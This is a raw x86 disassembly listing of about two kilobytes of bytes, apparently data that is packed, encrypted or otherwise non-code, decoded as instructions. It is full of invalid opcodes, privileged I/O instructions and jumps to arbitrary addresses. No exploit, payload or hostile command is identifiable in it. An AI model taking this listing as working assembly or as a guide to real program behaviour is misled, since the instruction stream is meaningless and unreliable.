  417f3b:	xchg   BYTE PTR [esi-0x72],bl
  417f3e:	mov    bh,0x6e
  417f40:	push   es
  417f41:	ja     0x417f7f
  417f43:	outs   dx,BYTE PTR ds:[esi]
  417f44:	cmp    DWORD PTR [ebx-0x7b8b6f7c],ecx
  417f4a:	dec    eax
  417f4b:	lock retf 0x82b5
  417f4f:	(bad)  
  417f50:	neg    DWORD PTR [edi]
  417f52:	mov    cs,WORD PTR [edx]
  417f54:	xchg   DWORD PTR [ecx],esp
  417f56:	rol    esi,cl
  417f58:	cmp    dl,cl
  417f5a:	aad    0x99
  417f5c:	mov    eax,0x8a3b837f
  417f61:	lods   al,BYTE PTR ds:[esi]
  417f62:	loope  0x417fd4
  417f64:	mov    eax,ds:0xa9fa1fe0
  417f69:	sub    DWORD PTR [edx+0xbdf10cb],edx
  417f6f:	cmp    al,al
  417f71:	or     eax,DWORD PTR [esi]
  417f73:	mov    al,ds:0x36f5e835
  417f78:	mov    ecx,0xcada967
  417f7d:	jb     0x417fef
  417f7f:	mov    dl,0x7d
  417f81:	cmp    bh,dh
  417f83:	ficom  DWORD PTR [eax+0x67ccbcee]
  417f89:	dec    ebx
  417f8a:	push   ds
  417f8b:	imul   ebx,DWORD PTR [edi+0x3c],0xffffff84
  417f8f:	mov    ebx,0x85f1ebe3
  417f94:	inc    ebp
  417f95:	lea    ecx,[eax+0x8]
  417f98:	sbb    eax,0x2bc09173
  417f9d:	call   DWORD PTR [edi]
  417f9f:	call   0x340e6bb
  417fa4:	repz xchg edx,eax
  417fa6:	jge    0x418002
  417fa8:	and    BYTE PTR [ebp-0x3cf8d986],bh
  417fae:	popa   
  417faf:	push   esi
  417fb0:	or     DWORD PTR [ebx-0x35ff476d],ebp
  417fb6:	cli    
  417fb7:	inc    ecx
  417fb8:	(bad)  
  417fb9:	pop    ebp
  417fba:	dec    ecx
  417fbb:	dec    ecx
  417fbc:	inc    edx
  417fbd:	cmp    al,0x83
  417fbf:	into   
  417fc0:	cwde   
  417fc1:	inc    ebp
  417fc2:	and    edx,eax
  417fc4:	add    al,dl
  417fc6:	pushf  
  417fc7:	dec    esp
  417fc8:	adc    BYTE PTR [ebp+0x28658f45],cl
  417fce:	jle    0x417f85
  417fd0:	sub    eax,0x38dfff4f
  417fd5:	stos   BYTE PTR es:[edi],al
  417fd6:	push   0x20
  417fd8:	add    BYTE PTR [esi+0x50],dl
  417fdb:	sbb    bh,0xf9
  417fde:	gs add eax,0xbbe052ba
  417fe4:	pop    edi
  417fe5:	sbb    eax,0x788da8e2
  417fea:	sub    ebp,DWORD PTR [edx]
  417fec:	rol    DWORD PTR [edi-0x12fc3148],cl
  417ff2:	imul   DWORD PTR ds:0xbf6793e8
  417ff8:	sbb    DWORD PTR [ecx+0x39c50b13],esp
  417ffe:	in     eax,dx
  417fff:	fidiv  DWORD PTR [edx-0x5ac9136a]
  418005:	jns    0x41800f
  418007:	enter  0x5eef,0xb0
  41800b:	mov    ebx,0x6970f4a9
  418010:	in     al,dx
  418011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418013:	xchg   esp,eax
  418014:	push   cs
  418015:	das    
  418016:	dec    esp
  418017:	cmp    BYTE PTR ds:0x70b23659,bl
  41801d:	ror    BYTE PTR [edx],1
  41801f:	rol    DWORD PTR [edi+0x1c080e0],1
  418025:	push   eax
  418026:	mov    cl,0x6b
  418028:	repnz in eax,dx
  41802a:	out    0x27,eax
  41802c:	icebp  
  41802d:	xchg   edi,eax
  41802e:	xchg   ecx,eax
  41802f:	mov    ds:0x1d0792da,al
  418034:	out    dx,eax
  418035:	pusha  
  418036:	je     0x417fbf
  418038:	sub    bl,BYTE PTR [ebx+0x66]
  41803b:	imul   ecx,DWORD PTR [esi+ebx*8+0x55],0xffffffcc
  418040:	retf   0x2822
  418043:	push   ss
  418044:	sub    BYTE PTR [esi+0x6835664d],bh
  41804a:	add    BYTE PTR [eax+0xd],ah
  41804d:	push   cs
  41804e:	gs pop ebx
  418050:	adc    eax,0x7ef3ebbe
  418055:	ja     0x418044
  418057:	shr    esp,0x74
  41805a:	scas   eax,DWORD PTR es:[edi]
  41805b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41805c:	aaa    
  41805d:	add    eax,0x72ab591
  418062:	and    edx,eax
  418064:	cmp    eax,0xc6c0ce53
  418069:	fmul   st(6),st
  41806b:	or     al,0x8b
  41806d:	xlat   BYTE PTR ds:[ebx]
  41806e:	ins    BYTE PTR es:[edi],dx
  41806f:	ins    BYTE PTR es:[edi],dx
  418070:	dec    ebx
  418071:	mov    ds:0xf0cc1652,eax
  418076:	dec    ebx
  418077:	xchg   ebp,eax
  418078:	pop    edi
  418079:	mov    ebp,0xb6e75988
  41807e:	and    DWORD PTR [eax],edx
  418080:	jb     0x418071
  418082:	bound  ecx,QWORD PTR [ebp+0x77900385]
  418088:	jmp    0x41807a
  41808a:	sub    DWORD PTR [esi+0x4b],0x40
  41808e:	call   DWORD PTR [eax-0x1b501182]
  418094:	enter  0xf91e,0xb3
  418098:	jp     0x41805d
  41809a:	push   esi
  41809b:	jl     0x418099
  41809d:	out    dx,al
  41809e:	mov    ds:0x4930fcf8,eax
  4180a3:	sub    ebx,edi
  4180a5:	sub    bh,BYTE PTR [edi+0x7d445d4e]
  4180ab:	nop
  4180ac:	pop    esi
  4180ad:	repnz mov ah,0x9
  4180b0:	pop    ss
  4180b1:	(bad)  
  4180b3:	inc    ebp
  4180b4:	mov    bh,0xfe
  4180b6:	xor    al,bl
  4180b8:	mov    ah,0x7c
  4180ba:	imul   edx,DWORD PTR [ecx],0x933649b2
  4180c0:	ret    
  4180c1:	push   eax
  4180c2:	sub    ebx,ebx
  4180c4:	adc    bh,BYTE PTR [ebx+0x757e7ffb]
  4180ca:	out    0x8e,eax
  4180cc:	and    BYTE PTR [eax-0x2b3494f8],bl
  4180d2:	inc    ecx
  4180d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180d4:	inc    edi
  4180d5:	ror    DWORD PTR [edi+0x371b946e],cl
  4180db:	mov    al,ds:0x3041e6fe
  4180e0:	adc    al,0x3b
  4180e2:	mov    dh,0xfc
  4180e4:	push   ecx
  4180e5:	in     eax,0xcb
  4180e7:	pop    eax
  4180e8:	mov    BYTE PTR [ebp+eax*1+0x63800e66],bl
  4180ef:	mov    bl,0xc2
  4180f1:	pusha  
  4180f2:	sti    
  4180f3:	out    0x2,eax
  4180f5:	and    esp,DWORD PTR [esp-0xa]
  4180f9:	jne    0x418107
  4180fb:	lock adc eax,0x7b7afd89
  418101:	fnsave [esi-0x7115a6cd]
  418107:	sub    bh,BYTE PTR [ebp-0x5b]
  41810a:	mov    es:0x6f62a29d,al
  418110:	jmp    0xd6ce:0xec651f4f
  418117:	pop    edx
  418118:	push   ds
  418119:	add    BYTE PTR [esi+eiz*8-0x28],0x65
  41811e:	call   0xae18e790
  418123:	xor    esp,DWORD PTR [ebp-0x4779c59e]
  418129:	ret    
  41812a:	sub    esi,DWORD PTR [edx+0xd]
  41812d:	xor    BYTE PTR [edi],cl
  41812f:	add    al,0xf6
  418131:	test   eax,0xce0cc8da
  418136:	xchg   ebp,eax
  418137:	mov    bh,0x5b
  418139:	mov    eax,0x54e4117
  41813e:	(bad)  
  41813f:	ins    BYTE PTR es:[edi],dx
  418140:	add    al,0xf1
  418142:	push   ebx
  418143:	test   al,0xc4
  418145:	aam    0xb2
  418147:	dec    esi
  418148:	imul   edi,ecx,0xffffffe6
  41814b:	cmp    ebp,DWORD PTR [eax-0xa]
  41814e:	inc    eax
  41814f:	and    eax,0x6d742182
  418154:	mov    DWORD PTR [ecx-0x3c],edx
  418157:	ins    DWORD PTR es:[edi],dx
  418158:	xchg   ebx,eax
  418159:	(bad)  
  41815a:	add    bh,BYTE PTR ss:[esp+eax*8+0x6e2b85e9]
  418162:	push   eax
  418163:	pop    ecx
  418164:	popa   
  418165:	enter  0x8c62,0x77
  418169:	xchg   BYTE PTR [edx-0x16],bl
  41816c:	and    al,0x17
  41816e:	fiadd  DWORD PTR [ebx-0x62]
  418171:	adc    al,0x83
  418173:	jmp    0xaf27:0x675d58f0
  41817a:	add    esi,DWORD PTR [edx-0x30]
  41817d:	xor    esp,edx
  41817f:	xor    esp,DWORD PTR [edi+0x5cba49e5]
  418185:	pusha  
  418186:	mov    ?,edi
  418188:	jl     0x4181d9
  41818a:	jns    0x418143
  41818c:	sbb    al,0xda
  41818e:	imul   edi,DWORD PTR [edx],0xffffffbd
  418191:	leave  
  418192:	std    
  418193:	jcxz   0x41811e
  418196:	fwait
  418197:	adc    eax,0x3927e699
  41819c:	mov    ah,0xca
  41819e:	fld    QWORD PTR [edx+0x28]
  4181a1:	inc    esp
  4181a2:	gs sbb al,0x52
  4181a5:	cmp    al,0x6d
  4181a7:	jle    0x418194
  4181a9:	add    ecx,0x2e
  4181ac:	enter  0xd3c5,0xa3
  4181b0:	jae    0x418190
  4181b2:	popa   
  4181b3:	xchg   DWORD PTR [edi+0x1b],esi
  4181b6:	mov    DWORD PTR ds:0x99da4eb6,ebp
  4181bc:	aam    0x83
  4181be:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4181c0:	adc    edx,DWORD PTR [esi+0x517b761a]
  4181c6:	lods   al,BYTE PTR ds:[esi]
  4181c7:	push   ecx
  4181c8:	cmp    eax,0x99be741e
  4181cd:	sub    esp,esi
  4181cf:	cli    
  4181d0:	add    al,0x31
  4181d2:	ja     0x418202
  4181d4:	fild   QWORD PTR [edi]
  4181d6:	jne    0x418195
  4181d8:	push   ecx
  4181d9:	jmp    0xef7d:0xf5b58d32
  4181e0:	test   DWORD PTR [edi],ebx
  4181e2:	add    DWORD PTR [esi],0xc4591f9b
  4181e8:	mov    bh,0x63
  4181ea:	lea    edx,[ebx+0x6e90bbb3]
  4181f0:	mov    ds:0xb68d88d5,eax
  4181f5:	fdiv   st(2),st
  4181f7:	jp     0x418192
  4181f9:	(bad)  
  4181fa:	mov    ebx,0xb88d2af9
  4181ff:	es pop ebx
  418201:	xchg   DWORD PTR [eax],ebp
  418203:	xchg   ebx,ebx
  418205:	inc    edi
  418206:	sub    al,0x5
  418208:	pop    ds
  418209:	call   0x7037d0b1
  41820e:	(bad)  
  41820f:	xchg   edx,eax
  418210:	mov    cl,0xca
  418212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418213:	mov    eax,0x6598683d
  418218:	sub    bl,BYTE PTR [ebx-0x66]
  41821b:	xor    ecx,DWORD PTR [ebx+0x5b751621]
  418221:	push   0x5c
  418223:	xor    al,0xc2
  418225:	ja     0x41820d
  418227:	xor    al,0x69
  418229:	pop    esp
  41822a:	inc    ecx
  41822b:	or     cl,dl
  41822d:	mov    dh,0xe0
  41822f:	mov    dh,0xfb
  418231:	(bad)  
  418232:	mov    eax,DWORD PTR [esi+0x35c35b2f]
  418238:	or     bh,bh
  41823a:	fist   DWORD PTR [ecx]
  41823c:	lods   al,BYTE PTR ds:[esi]
  41823d:	and    eax,0x5eee85b0
  418242:	outs   dx,DWORD PTR ds:[esi]
  418243:	jne    0x4182a0
  418245:	sbb    ecx,DWORD PTR [ebx-0x17]
  418248:	jg     0x4181f6
  41824a:	clc    
  41824b:	test   DWORD PTR [eax-0x31],ebp
  41824e:	xchg   esp,eax
  41824f:	pop    esi
  418250:	(bad)  [ebx-0x7cc15c30]
  418256:	mov    ds:0x9ce758dc,eax
  41825b:	(bad)  
  41825d:	pusha  
  41825e:	ret    0x481f
  418261:	sti    
  418262:	mov    ds:0x32809c15,eax
  418267:	or     eax,0x5e0c622
  41826c:	adc    BYTE PTR [esi+eiz*4+0x3380e9fc],bl
  418273:	push   es
  418274:	ret    0x46df
  418277:	fs sbb al,0x27
  41827a:	push   ebx
  41827b:	jl     0x418282
  41827d:	out    dx,eax
  41827e:	jg     0x4182c2
  418280:	(bad)  
  418281:	cmp    al,ch
  418283:	les    esi,FWORD PTR [esi]
  418285:	add    DWORD PTR [ebx],edi
  418287:	jnp    0x4182c6
  418289:	test   al,0xab
  41828b:	mov    cl,0xa6
  41828d:	add    BYTE PTR [eax+0x44681fe0],0x1c
  418294:	pop    edx
  418295:	(bad)  
  418296:	lock push 0xfffffff2
  418299:	(bad)  
  41829a:	clc    
  41829b:	int    0x5b
  41829d:	loope  0x418232
  41829f:	xor    cl,bh
  4182a1:	pushf  
  4182a2:	fisub  DWORD PTR [edi]
  4182a4:	cmp    ebx,edx
  4182a6:	jb     0x418257
  4182a8:	sbb    DWORD PTR [eax+0x50],ebx
  4182ab:	or     ah,BYTE PTR [edi]
  4182ad:	(bad)  
  4182ae:	mov    DWORD PTR [ecx],0x7c2785b4
  4182b4:	cld    
  4182b5:	div    BYTE PTR [edi]
  4182b7:	adc    eax,0x4d35a3b9
  4182bc:	sbb    edx,DWORD PTR [edx+0x5f2a49a6]
  4182c2:	mov    eax,0xf6d7c66a
  4182c7:	xor    edx,DWORD PTR [ebx-0x5]
  4182ca:	jecxz  0x4182e5
  4182cc:	retf   
  4182cd:	rol    edx,1
  4182cf:	sar    BYTE PTR [esi-0x51a141ab],cl
  4182d5:	retf   0x315e
  4182d8:	adc    bl,0x8
  4182db:	lea    edi,[ecx+0x76dd160e]
  4182e1:	xchg   ecx,eax
  4182e2:	mov    dl,0xb4
  4182e4:	cli    
  4182e5:	(bad)  
  4182e6:	push   0x4d9e9b92
  4182eb:	mov    dh,0x7a
  4182ed:	xchg   ebx,eax
  4182ee:	in     al,dx
  4182ef:	das    
  4182f0:	push   ds
  4182f1:	mov    dl,0x31
  4182f3:	test   eax,0xc8f402c6
  4182f8:	inc    ebx
  4182f9:	sub    bl,dl
  4182fb:	lock (bad) 
  4182fe:	dec    esi
  4182ff:	sti    
  418300:	icebp  
  418301:	inc    edi
  418302:	sbb    eax,0x8d742ffd
  418307:	fidiv  DWORD PTR [ecx+0x67dcdbb4]
  41830d:	loopne 0x418384
  41830f:	(bad)  
  418310:	cli    
  418311:	fwait
  418312:	and    ch,dl
  418314:	and    al,0xab
  418316:	add    eax,0x516cd82c
  41831b:	add    cl,BYTE PTR [ebp-0x32]
  41831e:	push   esi
  41831f:	imul   esp,DWORD PTR [edi+0x42d3c1d6],0x4e
  418326:	xchg   ebp,eax
  418327:	bound  edi,QWORD PTR ds:[edi+0x7c5ec51c]
  41832e:	inc    esi
  41832f:	cmp    DWORD PTR [ebx-0x7bb03843],ebp
  418335:	lahf   
  418336:	lock test eax,0x99e14ff0
  41833c:	cmp    DWORD PTR [ebp-0x3825c9b9],esp
  418342:	cmp    al,0xa6
  418344:	mov    BYTE PTR [eax+0x22aec322],bh
  41834a:	popa   
  41834b:	jmp    0x346f:0xd658e29e
  418352:	jo     0x4182fd
  418354:	xchg   ebp,eax
  418356:	or     dl,BYTE PTR [eax]
  418358:	jl     0x41838c
  41835a:	cmp    edi,DWORD PTR [ecx+edx*2-0x23f16694]
  418361:	sbb    bh,dl
  418363:	mov    ch,0xf9
  418365:	stos   DWORD PTR es:[edi],eax
  418366:	xor    eax,0xe2d9c737
  41836b:	mov    edi,0x1b9d27b8
  418370:	loopne 0x418361
  418372:	sub    edi,esi
  418374:	cs cmp al,0x3c
  418377:	ja     0x418316
  418379:	add    BYTE PTR [ecx-0x2cacd505],cl
  41837f:	ret    0xcc03
  418382:	push   esp
  418383:	push   0x807a97c0
  418388:	out    dx,al
  418389:	xchg   edi,eax
  41838a:	push   ss
  41838b:	pop    ecx
  41838c:	jg     0x4183b6
  41838e:	bound  ebx,QWORD PTR [eax]
  418390:	stc    
  418391:	push   0xa263006f
  418396:	add    al,cl
  418398:	out    0x47,al
  41839a:	xor    DWORD PTR [esi+0xf287cfc],edx
  4183a0:	repz dec eax
  4183a2:	out    dx,eax
  4183a3:	mov    edx,es
  4183a5:	shl    BYTE PTR [edi],cl
  4183a7:	cmc    
  4183a8:	push   esi
  4183a9:	ja     0x41834e
  4183ab:	out    dx,al
  4183ac:	bound  ebx,QWORD PTR [edi+0x4fc173e8]
  4183b2:	or     DWORD PTR [edi-0x24],eax
  4183b5:	sub    al,0x7c
  4183b7:	add    edx,DWORD PTR [edi+0x4e]
  4183ba:	jns    0x418400
  4183bc:	repz pop ds
  4183be:	mov    BYTE PTR [edi+0x7631f55b],bl
  4183c4:	iret   
  4183c5:	add    esi,DWORD PTR [ecx-0x6b]
  4183c8:	add    ch,BYTE PTR [ebx-0x41]
  4183cb:	cmp    eax,0xbeda4194
  4183d0:	lea    edi,[ebx]
  4183d2:	pop    ebx
  4183d3:	sub    edi,edi
  4183d5:	push   0xb42cc266
  4183da:	add    al,0xb1
  4183dc:	cmp    ch,ch
  4183de:	mov    DWORD PTR [eax-0x72e34960],0xf9c35ea4
  4183e8:	retf   0x40fc
  4183eb:	pop    es
  4183ec:	sbb    DWORD PTR [esi],0xebeb9d88
  4183f2:	in     al,dx
  4183f3:	int3   
  4183f4:	ja     0x418379
  4183f6:	mov    ebp,0x39fb161f
  4183fb:	adc    DWORD PTR [ecx+0x3a],edi
  4183fe:	mov    cl,0xf1
  418400:	mov    eax,ds:0x807ccef6
  418405:	stos   DWORD PTR es:[edi],eax
  418406:	push   eax
  418407:	hlt    
  418408:	xchg   ebp,eax
  418409:	mov    edx,0x5dff33b6
  41840e:	jnp    0x41842b
  418410:	and    eax,0xc35bb0e1
  418415:	cmp    DWORD PTR [ebx+0x19afecef],esi
  41841b:	sub    eax,0xffffffc3
  41841e:	(bad)  
  41841f:	sti    
  418420:	std    
  418421:	xchg   eax,edi
  418423:	cs (bad) 
  418425:	fsub   DWORD PTR [edi]
  418427:	imul   eax,edx,0x53
  41842a:	cmc    
  41842b:	xchg   BYTE PTR [esi],al
  41842d:	ds lock ins BYTE PTR es:[edi],dx
  418430:	test   eax,0x99bfc329
  418435:	xchg   ecx,eax
  418436:	inc    esi
  418437:	sub    DWORD PTR ds:0xf8879f8f,eax
  41843d:	push   cs
  41843e:	mov    ebx,0x347e575a
  418443:	jmp    0xf771:0x4bd9e1e7
  41844a:	cmp    dh,BYTE PTR [eax+0x1470e0c1]
  418450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418452:	cld    
  418453:	mov    dh,0xca
  418455:	daa    
  418456:	sub    DWORD PTR [ebx],edi
  418458:	pop    ebp
  418459:	dec    eax
  41845a:	sbb    al,0xca
  41845c:	fsub   DWORD PTR [ebx+0x26]
  41845f:	int    0x40
  418461:	or     eax,0xdd5e0c1c
  418466:	repnz test DWORD PTR [esi+0x2e],ecx
  41846a:	mov    ch,0xa0
  41846c:	(bad)  
  41846d:	cwde   
  41846e:	bound  ebx,QWORD PTR [edx+0x2d595b9b]
  418474:	sbb    edx,DWORD PTR [edi-0x1a]
  418477:	outs   dx,BYTE PTR ds:[esi]
  418478:	or     esi,DWORD PTR [edx]
  41847a:	in     al,0x8
  41847c:	sub    al,0x1a
  41847e:	sub    DWORD PTR [eax],ebx
  418480:	jp     0x418457
  418482:	data16 cmp BYTE PTR [edi+0x75],ch
  418486:	add    BYTE PTR [ecx+ebp*1-0x4f348067],ch
  41848d:	fidivr DWORD PTR [ebx+0x590ab9dd]
  418493:	lock jo 0x418439
  418496:	or     dl,BYTE PTR [esi]
  418498:	dec    esi
  418499:	scas   eax,DWORD PTR es:[edi]
  41849a:	retf   0x9a6f
  41849d:	xchg   edi,eax
  41849e:	mov    esp,0x94eb91f5
  4184a3:	shl    esp,cl
  4184a5:	sti    
  4184a6:	fsubr  st(5),st
  4184a8:	mov    al,ds:0x1ca2374
  4184ad:	and    eax,0x21f4357f
  4184b2:	cmp    ch,BYTE PTR [edi]
  4184b4:	mov    dl,0xff
  4184b6:	in     al,dx
  4184b7:	xchg   ebp,ecx
  4184b9:	sub    al,BYTE PTR [eax-0x44]
  4184bc:	sub    ch,BYTE PTR [eax-0x75]
  4184bf:	sahf   
  4184c0:	cmc    
  4184c1:	push   0xc6788209
  4184c6:	outs   dx,DWORD PTR ds:[esi]
  4184c7:	fnstcw WORD PTR [eax+0x7d5f9d42]
  4184cd:	sbb    BYTE PTR [ecx],ch
  4184cf:	(bad)  [ebp-0x4a87f663]
  4184d5:	mov    ds:0x964f8239,eax
  4184da:	mov    dl,0x4f
  4184dc:	add    eax,0x2d20750e
  4184e1:	mov    edi,0xe31fa74d
  4184e6:	and    ebp,DWORD PTR [eax-0x37]
  4184e9:	inc    ecx
  4184ea:	fld    QWORD PTR [edx+0x35]
  4184ed:	sbb    DWORD PTR [edi+0x48],ebx
  4184f0:	das    
  4184f1:	repz pop ss
  4184f3:	minps  xmm7,XMMWORD PTR [edi-0x3225ff73]
  4184fa:	(bad)  
  4184fb:	pop    eax
  4184fc:	sub    esi,edi
  4184fe:	(bad)  
  4184ff:	sti    
  418500:	inc    edx
  418501:	push   esi
  418502:	(bad)  
  418504:	sti    
  418505:	mov    ecx,0x4305e9ab
  41850a:	adc    edx,DWORD PTR [ecx+0x3b]
  41850d:	pusha  
  41850e:	sbb    cl,BYTE PTR [esi-0x36]
  418511:	mov    edi,DWORD PTR [ebx-0x5a5a1770]
  418517:	repnz cld 
  418519:	xor    eax,0xb5c90753
  41851e:	dec    edx
  41851f:	ja     0x418560
  418521:	or     eax,0xb79174b2
  418526:	jno    0x4184f0
  418528:	sub    eax,0xd14233c2
  41852d:	dec    ebx
  41852e:	scas   eax,DWORD PTR es:[edi]
  41852f:	sbb    edx,DWORD PTR [ecx]
  418531:	adc    edx,DWORD PTR [ebp+0x48]
  418534:	push   ebp
  418535:	(bad)  
  418536:	std    
  418537:	(bad)  
  418538:	int    0xcd
  41853a:	fstp   TBYTE PTR [esp+esi*2+0x15f7b1fb]
  418541:	call   0x79488ef3
  418546:	dec    ecx
  418547:	xchg   esp,eax
  418548:	hlt    
  418549:	dec    esp
  41854a:	aam    0xe0
  41854c:	pop    edi
  41854d:	ror    edi,cl
  41854f:	ret    0xf817
  418552:	out    0xf1,eax
  418554:	sbb    edi,DWORD PTR [edi]
  418556:	push   ds
  418557:	loope  0x41858c
  418559:	or     DWORD PTR [edx],edx
  41855b:	stc    
  41855c:	jmp    0x573d6e37
  418561:	(bad)  
  418562:	fcom   QWORD PTR [edi+0x14]
  418565:	mov    edx,0x68080588
  41856a:	push   edx
  41856b:	pop    es
  41856c:	jge    0x41852b
  41856e:	xlat   BYTE PTR ds:[ebx]
  41856f:	or     dh,al
  418571:	jbe    0x4185d6
  418573:	rcl    BYTE PTR [esi+edi*4+0x3532e36f],0x5e
  41857b:	xchg   ebp,eax
  41857c:	mov    WORD PTR [edx],?
  41857e:	call   0xf570:0xbbf46afe
  418585:	inc    eax
  418586:	pop    ebp
  418587:	popa   
  418588:	pop    ecx
  418589:	xchg   al,ah
  41858b:	or     dl,BYTE PTR [edi]
  41858d:	in     al,0xbb
  41858f:	sbb    ecx,DWORD PTR [edx+0x72]
  418592:	call   0x3e053aef
  418597:	cdq    
  418598:	sti    
  418599:	inc    ecx
  41859a:	(bad)  
  41859b:	(bad)  
  41859c:	jge    0x418601
  41859e:	call   0x2c62a9c0
  4185a3:	or     al,0x61
  4185a5:	enter  0x56c7,0x8b
  4185a9:	pushf  
  4185aa:	inc    ebp
  4185ab:	add    ebx,esp
  4185ad:	mov    dh,0x44
  4185af:	rcr    BYTE PTR [eax+0x27],1
  4185b2:	cmc    
  4185b3:	int3   
  4185b4:	and    esp,DWORD PTR [edi+0x22d85f7b]
  4185ba:	mov    ah,0xf4
  4185bc:	sbb    bl,cl
  4185be:	outs   dx,DWORD PTR ds:[esi]
  4185bf:	imul   esi,edi,0xffffffbe
  4185c2:	aam    0x5
  4185c4:	xchg   esi,eax
  4185c5:	inc    ecx
  4185c6:	test   eax,0x950677e2
  4185cb:	lods   al,BYTE PTR ds:[esi]
  4185cc:	adc    al,0xef
  4185ce:	daa    
  4185cf:	jo     0x418601
  4185d1:	call   0xc2b6d300
  4185d6:	and    bl,cl
  4185d8:	mov    ds:0x4a434beb,eax
  4185dd:	jne    0x4185a6
  4185df:	rcl    BYTE PTR [ebp-0xad0084c],cl
  4185e5:	jl     0x418644
  4185e7:	jmp    0xa8d971d
  4185ec:	test   eax,eax
  4185ee:	add    BYTE PTR [eax+esi*2],cl
  4185f1:	pop    esi
  4185f2:	mov    WORD PTR [eax+0x50],fs
  4185f5:	icebp  
  4185f6:	cs ret 
  4185f8:	enter  0x1f30,0x71
  4185fc:	mov    esi,0xb703f36d
  418601:	jno    0x4185ab
  418603:	mov    edi,0xe4a7a4cc
  418608:	push   ebp
  418609:	xchg   edi,eax
  41860a:	inc    edi
  41860b:	(bad)  
  41860c:	pop    ebp
  41860d:	cmp    ebp,DWORD PTR [ecx-0x73b5ad71]
  418613:	call   0x48b633d0
  418618:	push   ebx
  418619:	mov    bh,0xf0
  41861b:	dec    edx
  41861c:	inc    ebx
  41861d:	dec    eax
  41861e:	fdiv   QWORD PTR [edx]
  418620:	adc    BYTE PTR [eax-0x357ed4d8],0xf1
  418627:	xor    ch,dh
  418629:	out    dx,al
  41862a:	push   ebx
  41862b:	imul   ebp,DWORD PTR [edi+0x78],0x3dac595d
  418632:	cmp    BYTE PTR [ebp+0xcc23ca0],ah
  418638:	in     eax,0xa4
  41863a:	lds    ebx,FWORD PTR [edx-0x7c9800ca]
  418640:	mov    ch,BYTE PTR [esi+ebp*2-0x75]
  418644:	int    0x22
  418646:	mov    edx,0xa1a04543
  41864b:	inc    eax
  41864c:	div    DWORD PTR [ecx-0x65]
  41864f:	lea    esp,[ecx+0x33ff6b84]
  418655:	mov    ebp,0x63312def
  41865a:	inc    ecx
  41865b:	jmp    0x4527b0d3
  418660:	out    0xd2,eax
  418662:	std    
  418663:	xchg   BYTE PTR gs:[ecx+edx*2+0x33],bh
  418668:	fiadd  DWORD PTR [edi]
  41866a:	aaa    
  41866b:	inc    ebx
  41866c:	mov    DWORD PTR ds:0xaca0bc91,esp
  418672:	xlat   BYTE PTR ds:[ebx]
  418673:	dec    edi
  418674:	and    eax,0x293f3f56
  418679:	psrad  mm3,QWORD PTR [eax]
  41867c:	repz aam 0x76
  41867f:	pop    edi
  418680:	sub    edx,DWORD PTR [esi+0xd]
  418683:	sub    al,BYTE PTR [ebx+eiz*2]
  418686:	mov    edx,eax
  418688:	ins    BYTE PTR es:[edi],dx
  418689:	inc    ebp
  41868a:	mov    edi,0x6dcd2b08
  41868f:	pop    ebp
  418690:	popa   
  418691:	inc    esp
  418692:	mov    cl,cl
  418694:	inc    esp
  418695:	mov    bl,0x49
  418697:	cld    
  418698:	and    ebp,DWORD PTR [eax]
  41869a:	jae    0x4186e7
  41869c:	mov    ebx,0x2a10f434
  4186a1:	mov    bl,0x35
  4186a3:	jae    0x41865d
  4186a5:	in     eax,dx
  4186a6:	and    BYTE PTR [edx],ch
  4186a8:	popf   
  4186a9:	jbe    0x4186a8
  4186ab:	dec    ebx
  4186ac:	jne    0x4186d2
  4186ae:	dec    ecx
  4186af:	lock outs dx,BYTE PTR ds:[esi]
  4186b1:	dec    ebx
  4186b2:	test   BYTE PTR [esi+eax*1+0x20],bl
  4186b6:	call   0xcc87:0x150559b7
  4186bd:	ror    BYTE PTR ds:0x50529c27,cl
  4186c3:	nop
  4186c4:	cwde   
  4186c5:	dec    ebp
  4186c6:	ins    BYTE PTR es:[edi],dx
  4186c7:	nop
  4186c8:	scas   al,BYTE PTR es:[edi]
  4186c9:	inc    eax
  4186ca:	mov    ds:0x13f2723e,al
  4186cf:	sbb    ebp,DWORD PTR [ebp-0x35]
  4186d2:	std    
  4186d3:	cs retf 
  4186d5:	in     eax,dx
  4186d6:	and    eax,0x88765b49
  4186db:	jp     0x418703
  4186dd:	mov    al,0x40
  4186df:	pop    ss
  4186e0:	mov    eax,ds:0xc444b4fa
  4186e5:	and    eax,0xb28364fd
  4186ea:	and    BYTE PTR [esi+eiz*8+0x65],0x20
  4186ef:	pop    esi
  4186f0:	mov    dl,0xd8
  4186f2:	dec    ebx
  4186f3:	adc    BYTE PTR [di],0x20
  4186f7:	mov    al,0xc1
  4186f9:	xchg   esp,eax
  4186fa:	add    ah,BYTE PTR [ebx+0x27]
  4186fd:	mov    ch,0x11
  4186ff:	lods   al,BYTE PTR ds:[esi]
  418700:	xor    edx,DWORD PTR [edi-0xadc1c3]
  418706:	add    al,0x67
  418708:	fwait
  418709:	add    edi,DWORD PTR [ebx]
  41870b:	js     0x418703
  41870d:	into   
  41870e:	sbb    edx,DWORD PTR [eax-0x42258f5b]
  418714:	and    DWORD PTR [ebp-0x4b660211],esi
  41871a:	sbb    BYTE PTR [ecx],bl
  41871c:	out    0x2a,eax
  41871e:	into   
  41871f:	or     ebp,esi
  418721:	and    ecx,DWORD PTR [ebx-0x5f]
  418724:	into   
  418725:	push   ss
  418726:	cs push ebp
  418728:	add    DWORD PTR [ecx],edx
  41872a:	xor    ecx,DWORD PTR [eax-0x30]
  41872d:	lea    esi,[esi]
  41872f:	pop    ebx
  418730:	repnz mov al,0xf1
  418733:	xor    DWORD PTR [edi-0x168b9acb],edx
  418739:	mov    al,ds:0xb1b11107
  41873e:	lock mov ch,0x4a
  418741:	fs ffreep st(0)
  418744:	xchg   BYTE PTR [edx],bh
  418746:	xchg   esp,eax
  418747:	xchg   esp,eax
  418748:	and    al,BYTE PTR [edx]
  41874a:	in     al,0xda
  41874c:	jecxz  0x4187af
  41874e:	lds    ebp,FWORD PTR [esi+edx*1]
  418751:	xlat   BYTE PTR ds:[ebx]
  418752:	pop    ebp
  418753:	cwde   
  418754:	xchg   edi,eax
  418755:	arpl   WORD PTR [esi],bp
  418757:	es iret 
  418759:	dec    ebp
